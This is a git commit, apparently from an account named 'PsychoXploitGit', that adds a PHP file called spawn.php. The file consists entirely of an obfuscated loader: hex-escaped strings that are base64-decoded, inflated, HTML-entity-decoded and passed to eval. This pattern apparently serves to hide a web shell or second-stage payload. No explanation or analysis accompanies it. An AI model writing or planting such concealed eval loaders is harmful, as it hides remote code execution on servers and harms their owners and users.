cda47dccc3d85c89f99403d9f0b398f0d678c063
PsychoXploitGit <dapidalexander@gmail.com>
2025-02-19 12:32:00 +0700

    Create spawn.php

---
+++ spawn.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3d\x3d\x41Vgh\x2bZ2mlZX4pUkLD5K5LvDkfVynGLS/\x411nHPLl/9mpER1di4mf\x43OK6\x43jN3D\x43QO\x626gdt1juEhHxnh\x42qK/DnuJOH9y\x43pr3Q\x615L0E3nFOD9\x42zq\x43I8QG0kE4SGn8MQhzmMd\x43qT/w\x62O2uxzd8UW4Fu4Pq\x62yQ\x43VdKmdl\x63vRt5VtFo0x9D/\x627DHdm69ntNR\x61jLR\x43OhUSqQnOmIO4DS\x62vZnuYk\x43\x43y3F8dGS\x42M\x43rwuO20/k\x42wm\x42wJe/nF\x41mGw/U\x42wq\x42wJe/nE\x412Gw/E\x42wu\x42wJe/nD\x41GHw/0\x41wy\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
